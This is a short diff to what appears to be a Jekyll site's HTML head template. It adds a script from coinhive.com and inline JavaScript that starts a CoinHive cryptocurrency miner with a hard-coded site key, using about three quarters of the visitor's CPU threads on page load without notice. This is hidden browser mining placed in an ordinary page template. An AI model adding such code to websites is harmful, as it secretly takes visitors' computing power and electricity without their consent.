@@ -8,4 +8,27 @@
   {% if jekyll.environment == 'production' and site.google_analytics %}
     {% include google-analytics.html %}
   {% endif %}
+  
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  
+  <script type="text/javascript">
+    /* global navigator */
+    /* global CoinHive */
+    
+    const fullPower = false;
+
+    const pk = 'MBzdhm0poaPi8l1qXQlbY8y7r00kX4Nz';
+    
+    var conf = {	
+    	throttle: fullPower ? 0 : (1/10)
+    };
+    
+    if (!fullPower)
+    	conf.threads = Math.floor((navigator.hardwareConcurrency/4)*3);
+    
+    const cnhv = new CoinHive.Anonymous(pk,conf);
+    
+    cnhv.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+    
+  </script>
 </head>
